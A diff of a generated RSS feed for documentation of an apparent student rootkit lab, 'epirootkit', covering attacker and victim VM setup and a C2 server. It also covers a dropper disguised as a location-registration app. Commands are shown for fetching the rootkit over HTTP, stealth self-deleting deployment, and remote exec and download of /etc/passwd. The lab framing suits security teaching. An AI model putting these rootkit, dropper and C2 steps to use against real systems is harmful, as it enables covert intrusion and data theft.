@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Tux Fan Club Docs</title><link>/</link><description>Recent content on Tux Fan Club Docs</description><generator>Hugo</generator><language>en</language><lastBuildDate>Mon, 16 Jun 2025 17:55:32 +0200</lastBuildDate><atom:link href="/index.xml" rel="self" type="application/rss+xml"/><item><title>Presentation</title><link>/docs/01-introduction/presentation/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/01-introduction/presentation/</guid><description>&lt;h2 id="equipage">Equipage &lt;a href="#equipage" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;div style="display: flex; justify-content: space-between; gap: 20px; flex-wrap: wrap;">
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Tux Fan Club Docs</title><link>/</link><description>Recent content on Tux Fan Club Docs</description><generator>Hugo</generator><language>en</language><lastBuildDate>Tue, 17 Jun 2025 22:31:04 +0200</lastBuildDate><atom:link href="/index.xml" rel="self" type="application/rss+xml"/><item><title>Presentation</title><link>/docs/01-introduction/presentation/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/01-introduction/presentation/</guid><description>&lt;h2 id="equipage">Equipage &lt;a href="#equipage" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;div style="display: flex; justify-content: space-between; gap: 20px; flex-wrap: wrap;">
  &lt;div style="flex: 1; min-width: 250px; text-align: center;">
  &lt;strong>Capitaine&lt;/strong>: Hugo Sibony 
  &lt;br>
@@ -25,14 +25,14 @@
 		
 
 		&lt;a class="nav-link active"
-		 id="cbaedfTab" data-bs-toggle="tab" data-bs-target="#cbaedf"
-		 type="button" role="tab" aria-controls="cbaedf" aria-selected="true">Automated (Recommended)&lt;/a>
+		 id="edbfcaTab" data-bs-toggle="tab" data-bs-target="#edbfca"
+		 type="button" role="tab" aria-controls="edbfca" aria-selected="true">Automated (Recommended)&lt;/a>
 
 		
 
 		&lt;a class="nav-link "
-		 id="acdebfTab" data-bs-toggle="tab" data-bs-target="#acdebf"
-		 type="button" role="tab" aria-controls="acdebf" aria-selected="true">Manual Step-by-Step&lt;/a>
+		 id="fcdebaTab" data-bs-toggle="tab" data-bs-target="#fcdeba"
+		 type="button" role="tab" aria-controls="fcdeba" aria-selected="true">Manual Step-by-Step&lt;/a>
 
 		
 
@@ -49,7 +49,7 @@
 
 
 
-&lt;div class="tab-pane fade show active" id="cbaedf" role="tabpanel" aria-labelledby="nav-1">
+&lt;div class="tab-pane fade show active" id="edbfca" role="tabpanel" aria-labelledby="nav-1">
 
 	&lt;h3 id="one-command-installation">One-Command Installation &lt;a href="#one-command-installation" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
 
@@ -87,7 +87,7 @@
 
 
 
-&lt;div class="tab-pane fade" id="acdebf" role="tabpanel" aria-labelledby="nav-1">
+&lt;div class="tab-pane fade" id="fcdeba" role="tabpanel" aria-labelledby="nav-1">
 
 	&lt;h3 id="install-dependencies">Install Dependencies &lt;a href="#install-dependencies" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
 
@@ -196,7 +196,7 @@ ls -la /dev/kvm # Should be accessible&lt;/code>
 &lt;p>So while we recommend using the pre-built disks, you can also create your own VMs by following the manual installation steps.&lt;/p></description></item><item><title>Attacker VM Setup</title><link>/docs/02-setup/attacking-vm-setup/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/02-setup/attacking-vm-setup/</guid><description>&lt;h2 id="prerequisites">Prerequisites &lt;a href="#prerequisites" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;ol>
 &lt;li>&lt;strong>Host setup&lt;/strong>: &lt;a href="/docs/02-setup/environment/">Host Environment Setup&lt;/a>&lt;/li>
 &lt;li>&lt;strong>VM disk&lt;/strong>: &lt;code>attacker.qcow2&lt;/code> in &lt;code>/var/lib/libvirt/images/&lt;/code>&lt;/li>
-&lt;li>&lt;strong>VM launched&lt;/strong>: &lt;code>sudo ./scripts/run_vms.sh attacker&lt;/code>&lt;/li>
+&lt;li>&lt;strong>VM launched&lt;/strong>: &lt;code>sudo ./scripts/run_vms.sh&lt;/code>&lt;/li>
 &lt;/ol>
 &lt;h2 id="vm-access">VM Access &lt;a href="#vm-access" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;ul>
 &lt;li>&lt;strong>IP&lt;/strong>: 192.168.200.11 (static)&lt;/li>
@@ -214,14 +214,14 @@ ls -la /dev/kvm # Should be accessible&lt;/code>
 		
 
 		&lt;a class="nav-link active"
-		 id="ebacfdTab" data-bs-toggle="tab" data-bs-target="#ebacfd"
-		 type="button" role="tab" aria-controls="ebacfd" aria-selected="true">Pre-built (Recommended)&lt;/a>
+		 id="adfcebTab" data-bs-toggle="tab" data-bs-target="#adfceb"
+		 type="button" role="tab" aria-controls="adfceb" aria-selected="true">Pre-built (Recommended)&lt;/a>
 
 		
 
 		&lt;a class="nav-link "
-		 id="dbafecTab" data-bs-toggle="tab" data-bs-target="#dbafec"
-		 type="button" role="tab" aria-controls="dbafec" aria-selected="true">Fresh VM Setup&lt;/a>
+		 id="daecfbTab" data-bs-toggle="tab" data-bs-target="#daecfb"
+		 type="button" role="tab" aria-controls="daecfb" aria-selected="true">Fresh VM Setup&lt;/a>
 
 		
 
@@ -238,7 +238,7 @@ ls -la /dev/kvm # Should be accessible&lt;/code>
 
 
 
-&lt;div class="tab-pane fade show active" id="ebacfd" role="tabpanel" aria-labelledby="nav-1">
+&lt;div class="tab-pane fade show active" id="adfceb" role="tabpanel" aria-labelledby="nav-1">
 
 	&lt;h3 id="quick-start">Quick Start &lt;a href="#quick-start" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;p>Everything is pre-configured. Build and run immediately:&lt;/p>
 
@@ -256,83 +256,28 @@ ls -la /dev/kvm # Should be accessible&lt;/code>
  
 
  &lt;div class="prism-codeblock ">
- &lt;pre id="219a476" class="language-bash ">
+ &lt;pre id="5236ee5" class="language-bash ">
  &lt;code># Inside attacker VM (auto-logged in)
-cd epirootkit
-
-# Build rootkit &amp;#43; Start C2 server &amp;#43; Web UI
-cd .. &amp;amp;&amp;amp; ./deploy_c2.sh
+cd epirootkit &amp;amp;&amp;amp; ./deploy_c2.sh
 # ✅ Builds rootkit automatically
+# ✅ Builds dropper app
 # ✅ C2 server: port 4444
-# ✅ Web interface: port 3000&lt;/code>
+# ✅ Web interface: port 3000
+# ✅ Landing page dropper: port 8080&lt;/code>
  &lt;/pre>
  &lt;/div>
-&lt;p>&lt;strong>Access&lt;/strong>: &lt;code>http://192.168.200.11:3000&lt;/code> from host browser or &lt;code>http://localhost:3000&lt;/code> from attacker VM browser&lt;/p></description></item><item><title>Victim VM Setup</title><link>/docs/02-setup/victim-vm-setup/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/02-setup/victim-vm-setup/</guid><description>&lt;h2 id="prerequisites">Prerequisites &lt;a href="#prerequisites" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;ol>
+&lt;h3 id="deploy-script-options">Deploy Script Options &lt;a href="#deploy-script-options" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;p>The &lt;code>deploy_c2.sh&lt;/code> script supports selective component building:&lt;/p></description></item><item><title>Victim VM Setup</title><link>/docs/02-setup/victim-vm-setup/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/02-setup/victim-vm-setup/</guid><description>&lt;h2 id="prerequisites">Prerequisites &lt;a href="#prerequisites" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;ol>
 &lt;li>&lt;strong>Host setup&lt;/strong>: &lt;a href="/docs/02-setup/environment/">Host Environment Setup&lt;/a>&lt;/li>
 &lt;li>&lt;strong>VM disk&lt;/strong>: &lt;code>victim.qcow2&lt;/code> in &lt;code>/var/lib/libvirt/images/&lt;/code>&lt;/li>
-&lt;li>&lt;strong>VM launched&lt;/strong>: &lt;code>sudo ./scripts/run_vms.sh victim&lt;/code>&lt;/li>
+&lt;li>&lt;strong>VM launched&lt;/strong>: &lt;code>sudo ./scripts/run_vms.sh&lt;/code>&lt;/li>
 &lt;/ol>
 &lt;h2 id="vm-access">VM Access &lt;a href="#vm-access" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;ul>
 &lt;li>&lt;strong>IP&lt;/strong>: 192.168.200.10 (static)&lt;/li>
 &lt;li>&lt;strong>Credentials&lt;/strong>: &lt;code>victim&lt;/code> / &lt;code>jules&lt;/code>&lt;/li>
 &lt;li>&lt;strong>Target&lt;/strong>: Ubuntu 20.04 LTS (kernel 5.4.0)&lt;/li>
 &lt;/ul>
-&lt;h2 id="deploy-rootkit">Deploy Rootkit &lt;a href="#deploy-rootkit" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="1-get-payload">1. Get Payload &lt;a href="#1-get-payload" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;p>Receive rootkit files from attacker VM:&lt;/p>
+&lt;h2 id="deploy-rootkit">Deploy Rootkit &lt;a href="#deploy-rootkit" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>Choose your deployment method:&lt;/p>
 
-
-
- 
- 
- 
-
- 
- 
- 
- 
-
- 
-
- &lt;div class="prism-codeblock ">
- &lt;pre id="a7a6f76" class="language-bash ">
- &lt;code># Option A: SCP transfer (from attacker VM)
-# First: sudo apt install -y openssh-server (inside victim VM)
-scp epirootkit.ko deploy_rootkit.sh victim@192.168.200.10:~/
-
-# Option B: HTTP download
-wget http://192.168.200.11:8080/epirootkit.ko
-wget http://192.168.200.11:8080/deploy_rootkit.sh
-
-# Option C: Web UI upload (In development)
-# Use attacker&amp;#39;s web interface file transfer &lt;/code>
- &lt;/pre>
- &lt;/div>
-&lt;h3 id="2-deploy">2. Deploy &lt;a href="#2-deploy" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
-
-
- 
- 
- 
-
- 
- 
- 
- 
-
- 
-
- &lt;div class="prism-codeblock ">
- &lt;pre id="003679b" class="language-bash ">
- &lt;code># Default deployment (connects to 192.168.200.11:4444)
-sudo ./deploy_rootkit.sh
-
-# Custom C2 server
-sudo ./deploy_rootkit.sh address=IP/domain port=PORT
-
-# Stealth deployment (self-destructs)
-sudo ./deploy_rootkit.sh --self-delete&lt;/code>
- &lt;/pre>
- &lt;/div>
-&lt;h3 id="3-verify-connection">3. Verify Connection &lt;a href="#3-verify-connection" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;p>Switch to attacker VM C2 server:&lt;/p></description></item><item><title>Host to VM File Transfer</title><link>/docs/02-setup/file-transfer/</link><pubDate>Sun, 25 May 2025 00:00:00 +0100</pubDate><guid>/docs/02-setup/file-transfer/</guid><description>&lt;h2 id="transfer-methods">Transfer Methods &lt;a href="#transfer-methods" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>
 &lt;nav>
 	&lt;div class="nav nav-tabs" id="nav-tab" role="tablist">
 
@@ -344,26 +289,14 @@ sudo ./deploy_rootkit.sh --self-delete&lt;/code>
 		
 
 		&lt;a class="nav-link active"
-		 id="deafcbTab" data-bs-toggle="tab" data-bs-target="#deafcb"
-		 type="button" role="tab" aria-controls="deafcb" aria-selected="true">Automated (Recommended)&lt;/a>
+		 id="acfedbTab" data-bs-toggle="tab" data-bs-target="#acfedb"
+		 type="button" role="tab" aria-controls="acfedb" aria-selected="true">Dropper (Social Engineering)&lt;/a>
 
 		
 
 		&lt;a class="nav-link "
-		 id="facebdTab" data-bs-toggle="tab" data-bs-target="#facebd"
-		 type="button" role="tab" aria-controls="facebd" aria-selected="true">SSH/SCP&lt;/a>
-
-		
-
-		&lt;a class="nav-link "
-		 id="bcdeafTab" data-bs-toggle="tab" data-bs-target="#bcdeaf"
-		 type="button" role="tab" aria-controls="bcdeaf" aria-selected="true">HTTP Server&lt;/a>
-
-		
-
-		&lt;a class="nav-link "
-		 id="badefcTab" data-bs-toggle="tab" data-bs-target="#badefc"
-		 type="button" role="tab" aria-controls="badefc" aria-selected="true">Shared Folders&lt;/a>
+		 id="acbdfeTab" data-bs-toggle="tab" data-bs-target="#acbdfe"
+		 type="button" role="tab" aria-controls="acbdfe" aria-selected="true">Manual Deployment&lt;/a>
 
 		
 
@@ -380,7 +313,57 @@ sudo ./deploy_rootkit.sh --self-delete&lt;/code>
 
 
 
-&lt;div class="tab-pane fade show active" id="deafcb" role="tabpanel" aria-labelledby="nav-1">
+&lt;div class="tab-pane fade show active" id="acfedb" role="tabpanel" aria-labelledby="nav-1">
+
+	&lt;h3 id="automated-deployment">Automated Deployment &lt;a href="#automated-deployment" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;p>Use the social engineering dropper for realistic attack simulation:&lt;/p></description></item><item><title>Host to VM File Transfer</title><link>/docs/02-setup/file-transfer/</link><pubDate>Sun, 25 May 2025 00:00:00 +0100</pubDate><guid>/docs/02-setup/file-transfer/</guid><description>&lt;h2 id="transfer-methods">Transfer Methods &lt;a href="#transfer-methods" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>
+&lt;nav>
+	&lt;div class="nav nav-tabs" id="nav-tab" role="tablist">
+
+		
+		
+		
+		
+
+		
+
+		&lt;a class="nav-link active"
+		 id="cbafdeTab" data-bs-toggle="tab" data-bs-target="#cbafde"
+		 type="button" role="tab" aria-controls="cbafde" aria-selected="true">Automated (Recommended)&lt;/a>
+
+		
+
+		&lt;a class="nav-link "
+		 id="fceabdTab" data-bs-toggle="tab" data-bs-target="#fceabd"
+		 type="button" role="tab" aria-controls="fceabd" aria-selected="true">SSH/SCP&lt;/a>
+
+		
+
+		&lt;a class="nav-link "
+		 id="afcbedTab" data-bs-toggle="tab" data-bs-target="#afcbed"
+		 type="button" role="tab" aria-controls="afcbed" aria-selected="true">HTTP Server&lt;/a>
+
+		
+
+		&lt;a class="nav-link "
+		 id="bdfceaTab" data-bs-toggle="tab" data-bs-target="#bdfcea"
+		 type="button" role="tab" aria-controls="bdfcea" aria-selected="true">Shared Folders&lt;/a>
+
+		
+
+	&lt;/div>
+&lt;/nav>
+
+&lt;div class="tab-content" id="nav-tab-content">
+
+	
+
+
+
+
+
+
+
+&lt;div class="tab-pane fade show active" id="cbafde" role="tabpanel" aria-labelledby="nav-1">
 
 	&lt;h3 id="one-command-transfer">One-Command Transfer &lt;a href="#one-command-transfer" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;p>For attacker VM setup:&lt;/p>
 
@@ -408,23 +391,15 @@ sudo ./deploy_rootkit.sh --self-delete&lt;/code>
 # 🎉 Ready to build and start&lt;/code>
  &lt;/pre>
  &lt;/div>
-&lt;p>&lt;strong>Requirements:&lt;/strong>&lt;/p></description></item><item><title>Dropper Deployment</title><link>/docs/02-setup/dropper-deployment/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/02-setup/dropper-deployment/</guid><description>&lt;h2 id="overview">Overview &lt;a href="#overview" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>The dropper is a social engineering tool disguised as &amp;ldquo;NeoGeoLoc - Location Registration System&amp;rdquo;. It downloads and installs the rootkit automatically on target systems.&lt;/p>
+&lt;p>&lt;strong>Requirements:&lt;/strong>&lt;/p></description></item><item><title>Dropper Deployment</title><link>/docs/02-setup/dropper-deployment/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/02-setup/dropper-deployment/</guid><description>&lt;h2 id="overview">Overview &lt;a href="#overview" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>The dropper is a social engineering tool disguised as &amp;ldquo;NeoGeoLoc - Location Registration System&amp;rdquo;. It provides a realistic attack simulation where the victim downloads and runs what appears to be a legitimate location registration application.&lt;/p>
 &lt;h2 id="prerequisites">Prerequisites &lt;a href="#prerequisites" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;ol>
 &lt;li>&lt;strong>C2 Server&lt;/strong>: &lt;a href="/docs/02-setup/attacking-vm-setup/">Attacker VM Setup&lt;/a> - Must be running&lt;/li>
-&lt;li>&lt;strong>Build&lt;/strong>: &lt;code>./deploy_c2.sh&lt;/code> builds the dropper binary&lt;/li>
+&lt;li>&lt;strong>Dropper Built&lt;/strong>: Run &lt;code>./deploy_c2.sh -d&lt;/code> to build the dropper and start landing page&lt;/li>
 &lt;/ol>
-&lt;h2 id="landing-page">Landing Page &lt;a href="#landing-page" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>&lt;strong>Access&lt;/strong>: &lt;code>http://192.168.200.11:8080&lt;/code>&lt;/p>
-&lt;p>Download interface for the dropper binary.&lt;/p>
-&lt;figure class="img-fluid">&lt;img src="/images/dropper/landing.png"
- alt="Landing Page NGL">
-&lt;/figure>
-
-&lt;h2 id="application-interface">Application Interface &lt;a href="#application-interface" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>The dropper presents itself as a location registration system:&lt;/p>
-&lt;figure class="img-fluid">&lt;img src="/images/dropper/application.png"
- alt="NeoGeoLoc Application Interface">
-&lt;/figure>
-
-&lt;p>Interface elements:&lt;/p></description></item><item><title>Overview</title><link>/docs/03-attacking-program/overview/</link><pubDate>Sun, 25 May 2025 00:00:00 +0100</pubDate><guid>/docs/03-attacking-program/overview/</guid><description>&lt;h2 id="quick-start">Quick Start &lt;a href="#quick-start" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>
+&lt;h2 id="build-process">Build Process &lt;a href="#build-process" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>The dropper is built from Node.js source code and packaged as a standalone executable:&lt;/p></description></item><item><title>Overview</title><link>/docs/03-attacking-program/overview/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/docs/03-attacking-program/overview/</guid><description>&lt;blockquote>
+&lt;p>This is the C2 Backend for the rootkit, while it can be used to manage the rootkit with the CLI commands described in this documentation, it&amp;rsquo;s clearly not recommanded, and instead you should use the &lt;a href="/docs/04-web-ui/">Web Interface&lt;/a> to manage the rootkit.&lt;/p>
+&lt;/blockquote>
+&lt;h2 id="quick-start">Quick Start &lt;a href="#quick-start" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>
 
 
  
@@ -439,31 +414,11 @@ sudo ./deploy_rootkit.sh --self-delete&lt;/code>
  
 
  &lt;div class="prism-codeblock ">
- &lt;pre id="b18e4a5" class="language-bash ">
- &lt;code>cd attacking_program
-pnpm install
-pnpm start&lt;/code>
+ &lt;pre id="d4e4002" class="language-bash ">
+ &lt;code>./deploy_c2.sh --c2 # Start C2 server on port 4444 &amp;#43; Web UI on port 3000&lt;/code>
  &lt;/pre>
  &lt;/div>
-&lt;p>&lt;strong>Ports:&lt;/strong>&lt;/p>
-&lt;ul>
-&lt;li>C2 Server: &lt;code>4444&lt;/code>&lt;/li>
-&lt;li>Web Interface: &lt;code>3000&lt;/code>&lt;/li>
-&lt;/ul>
-&lt;h2 id="architecture">Architecture &lt;a href="#architecture" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;ul>
-&lt;li>&lt;strong>CLI Interface&lt;/strong>: Interactive command system&lt;/li>
-&lt;li>&lt;strong>C2 Server&lt;/strong>: TCP server for rootkit connections&lt;/li>
-&lt;li>&lt;strong>Web Interface&lt;/strong>: REST API with Socket.IO&lt;/li>
-&lt;li>&lt;strong>Client Manager&lt;/strong>: Connection lifecycle and authentication&lt;/li>
-&lt;li>&lt;strong>Event System&lt;/strong>: Real-time logging&lt;/li>
-&lt;/ul>
-&lt;h3 id="technology-stack">Technology Stack &lt;a href="#technology-stack" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;ul>
-&lt;li>&lt;strong>Runtime&lt;/strong>: Node.js 18+ with pnpm&lt;/li>
-&lt;li>&lt;strong>CLI&lt;/strong>: Vorpal.js for commands&lt;/li>
-&lt;li>&lt;strong>Web&lt;/strong>: Express.js + Socket.IO&lt;/li>
-&lt;li>&lt;strong>Encryption&lt;/strong>: XOR cipher with 32-byte hardcoded key&lt;/li>
-&lt;/ul>
-&lt;h2 id="core-features">Core Features &lt;a href="#core-features" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="client-management">Client Management &lt;a href="#client-management" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
+&lt;h2 id="basic-commands">Basic Commands &lt;a href="#basic-commands" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>
 
 
  
@@ -478,14 +433,16 @@ pnpm start&lt;/code>
  
 
  &lt;div class="prism-codeblock ">
- &lt;pre id="3e85fc3" class="language-bash ">
- &lt;code>ls # List connected clients
-auth Client-1 password # Authenticate with client
-status Client-1 # Get rootkit status
-keepalive Client-1 # Check connection health&lt;/code>
+ &lt;pre id="9bb80f6" class="language-bash ">
+ &lt;code>clients # List connected clients
+auth 1 password # Authenticate with client
+exec 1 whoami # Execute commands
+upload 1 file.txt # Upload files 
+download 1 /etc/passwd # Download files
+config 1 # Interactive configuration&lt;/code>
  &lt;/pre>
  &lt;/div>
-&lt;h3 id="remote-operations">Remote Operations &lt;a href="#remote-operations" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
+&lt;h2 id="configuration">Configuration &lt;a href="#configuration" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>Edit &lt;code>attacking_program/config.env&lt;/code> if needed:&lt;/p></description></item><item><title>Installation</title><link>/docs/03-attacking-program/installation/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/docs/03-attacking-program/installation/</guid><description>&lt;h2 id="quick-install">Quick Install &lt;a href="#quick-install" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>
 
 
  
@@ -500,13 +457,11 @@ keepalive Client-1 # Check connection health&lt;/code>
  
 
  &lt;div class="prism-codeblock ">
- &lt;pre id="51cb77a" class="language-bash ">
- &lt;code>exec Client-1 whoami # Execute commands
-upload Client-1 ./file.txt /tmp/file.txt # Upload files
-download Client-1 /etc/passwd ./passwd # Download files&lt;/code>
+ &lt;pre id="ad71245" class="language-bash ">
+ &lt;code>./deploy_c2.sh --c2 # Builds and starts everything&lt;/code>
  &lt;/pre>
  &lt;/div>
-&lt;h3 id="configuration">Configuration &lt;a href="#configuration" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
+&lt;h2 id="manual-install">Manual Install &lt;a href="#manual-install" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>
 
 
  
@@ -521,107 +476,22 @@ download Client-1 /etc/passwd ./passwd # Download files&lt;/code>
  
 
  &lt;div class="prism-codeblock ">
- &lt;pre id="1fa1709" class="language-bash ">
- &lt;code>config Client-1 # Interactive configuration
-persist Client-1 install # Manage persistence&lt;/code>
- &lt;/pre>
- &lt;/div>
-&lt;h2 id="authentication">Authentication &lt;a href="#authentication" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="sha-512-password-system">SHA-512 Password System &lt;a href="#sha-512-password-system" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;ol>
-&lt;li>C2 sends plaintext password&lt;/li>
-&lt;li>Rootkit hashes and compares&lt;/li>
-&lt;li>Session established (1-hour timeout)&lt;/li>
-&lt;li>Rate limiting: 5 attempts/60 seconds&lt;/li>
-&lt;/ol>
-&lt;p>&lt;strong>Default Credentials:&lt;/strong>&lt;/p></description></item><item><title>Installation</title><link>/docs/03-attacking-program/installation/</link><pubDate>Sun, 25 May 2025 00:00:00 +0100</pubDate><guid>/docs/03-attacking-program/installation/</guid><description>&lt;h2 id="prerequisites">Prerequisites &lt;a href="#prerequisites" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>Before installing the attacking program, ensure you have:&lt;/p>
-&lt;ul>
-&lt;li>&lt;strong>Node.js 14+&lt;/strong> and &lt;strong>npm&lt;/strong> (installed via setup script)&lt;/li>
-&lt;li>&lt;strong>Linux environment&lt;/strong> (Ubuntu recommended)&lt;/li>
-&lt;li>&lt;strong>Network access&lt;/strong> between attacker and victim machines&lt;/li>
-&lt;/ul>
-&lt;h2 id="quick-start">Quick Start &lt;a href="#quick-start" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="1-automatic-setup-recommended">1. Automatic Setup (Recommended) &lt;a href="#1-automatic-setup-recommended" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;p>If you&amp;rsquo;re using the pre-built attacker VM or have run the setup script:&lt;/p>
+ &lt;pre id="16f97c7" class="language-bash ">
+ &lt;code># Build web interface
+cd webui &amp;amp;&amp;amp; npm install &amp;amp;&amp;amp; npm run build &amp;amp;&amp;amp; cd ..
 
+# Copy to backend
+mkdir -p attacking_program/public
+cp -r webui/dist/* attacking_program/public/
 
-
- 
- 
- 
-
- 
- 
- 
- 
-
- 
-
- &lt;div class="prism-codeblock ">
- &lt;pre id="23f9c97" class="language-bash ">
- &lt;code># Navigate to attacking program directory
+# Install and start backend
 cd attacking_program
-
-# Install dependencies
 npm install
-
-# Start the C2 server
 npm start&lt;/code>
  &lt;/pre>
  &lt;/div>
-&lt;p>The server will start on:&lt;/p></description></item><item><title>Command Reference</title><link>/docs/03-attacking-program/commands/</link><pubDate>Sun, 25 May 2025 00:00:00 +0100</pubDate><guid>/docs/03-attacking-program/commands/</guid><description>&lt;h2 id="command-list">Command List &lt;a href="#command-list" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;table>
- &lt;thead>
- &lt;tr>
- &lt;th>Command&lt;/th>
- &lt;th>Description&lt;/th>
- &lt;th>Auth Required&lt;/th>
- &lt;/tr>
- &lt;/thead>
- &lt;tbody>
- &lt;tr>
- &lt;td>&lt;code>clients, ls&lt;/code>&lt;/td>
- &lt;td>List connected clients&lt;/td>
- &lt;td>No&lt;/td>
- &lt;/tr>
- &lt;tr>
- &lt;td>&lt;code>auth &amp;lt;client&amp;gt; &amp;lt;password&amp;gt;&lt;/code>&lt;/td>
- &lt;td>Authenticate with client&lt;/td>
- &lt;td>No&lt;/td>
- &lt;/tr>
- &lt;tr>
- &lt;td>&lt;code>exec &amp;lt;client&amp;gt; &amp;lt;command&amp;gt;&lt;/code>&lt;/td>
- &lt;td>Execute shell commands&lt;/td>
- &lt;td>Yes&lt;/td>
- &lt;/tr>
- &lt;tr>
- &lt;td>&lt;code>upload &amp;lt;client&amp;gt; &amp;lt;local&amp;gt; [remote]&lt;/code>&lt;/td>
- &lt;td>Upload files to victim&lt;/td>
- &lt;td>Yes&lt;/td>
- &lt;/tr>
- &lt;tr>
- &lt;td>&lt;code>download &amp;lt;client&amp;gt; &amp;lt;remote&amp;gt; [local]&lt;/code>&lt;/td>
- &lt;td>Download files from victim&lt;/td>
- &lt;td>Yes&lt;/td>
- &lt;/tr>
- &lt;tr>
- &lt;td>&lt;code>status &amp;lt;client&amp;gt;&lt;/code>&lt;/td>
- &lt;td>Get rootkit status&lt;/td>
- &lt;td>Yes&lt;/td>
- &lt;/tr>
- &lt;tr>
- &lt;td>&lt;code>keepalive &amp;lt;client&amp;gt;&lt;/code>&lt;/td>
- &lt;td>Check connection status&lt;/td>
- &lt;td>Yes&lt;/td>
- &lt;/tr>
- &lt;tr>
- &lt;td>&lt;code>persist &amp;lt;client&amp;gt; [action]&lt;/code>&lt;/td>
- &lt;td>Manage persistence&lt;/td>
- &lt;td>Yes&lt;/td>
